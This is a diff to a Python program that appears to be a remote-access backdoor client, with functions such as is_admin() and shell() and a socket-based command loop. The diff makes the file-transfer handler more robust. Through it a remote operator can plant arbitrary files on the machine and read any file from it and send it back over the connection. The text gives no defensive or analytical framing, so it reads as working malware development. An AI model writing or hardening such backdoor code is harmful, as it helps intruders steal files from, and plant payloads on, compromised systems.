@@ -79,48 +79,60 @@ def is_admin():
 def handle_file_transfer(command_data):
     try:
         if command_data['command'] == 'upload':
-            filename = command_data['filename']
-            file_size = command_data['size']
-            
-            # Send ready confirmation
-            reliable_send({'ready': True})
-            
-            # Receive and save file
-            received = 0
-            with open(filename, 'wb') as f:
-                while received < file_size:
-                    chunk = s.recv(min(4096, file_size - received))
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    received += len(chunk)
-            
-            if received == file_size:
-                reliable_send({'success': True})
-            else:
-                reliable_send({'error': 'Upload incomplete'})
+            try:
+                filename = command_data['filename']
+                file_size = int(command_data['size'])  # Ensure size is an integer
+                
+                # Send ready confirmation
+                reliable_send({'ready': True})
+                
+                # Receive and save file
+                received = 0
+                with open(filename, 'wb') as f:
+                    while received < file_size:
+                        chunk = s.recv(min(4096, file_size - received))
+                        if not chunk:
+                            break
+                        f.write(chunk)
+                        received += len(chunk)
+                
+                if received == file_size:
+                    reliable_send({'success': True})
+                else:
+                    reliable_send({'error': 'Upload incomplete'})
+                    
+            except (ValueError, TypeError) as e:
+                reliable_send({'error': f'Invalid file size: {str(e)}'})
+            except Exception as e:
+                reliable_send({'error': str(e)})
                 
         elif command_data['command'] == 'download':
-            filename = command_data['filename']
             try:
-                with open(filename, 'rb') as f:
-                    file_data = f.read()
+                filename = command_data['filename']
+                try:
+                    with open(filename, 'rb') as f:
+                        file_data = f.read()
+                        
+                    # Send file size first
+                    reliable_send({
+                        'size': len(file_data)
+                    })
                     
-                # Send file size first
-                reliable_send({
-                    'size': len(file_data)
-                })
-                
-                # Send file data
-                s.sendall(file_data)
-                
-            except FileNotFoundError:
-                reliable_send({'error': 'File not found'})
+                    # Send file data
+                    s.sendall(file_data)
+                    
+                except FileNotFoundError:
+                    reliable_send({'error': 'File not found'})
+                except Exception as e:
+                    reliable_send({'error': str(e)})
             except Exception as e:
                 reliable_send({'error': str(e)})
                 
     except Exception as e:
-        reliable_send({'error': str(e)})
+        try:
+            reliable_send({'error': str(e)})
+        except:
+            pass
 
 def shell():
     while True:
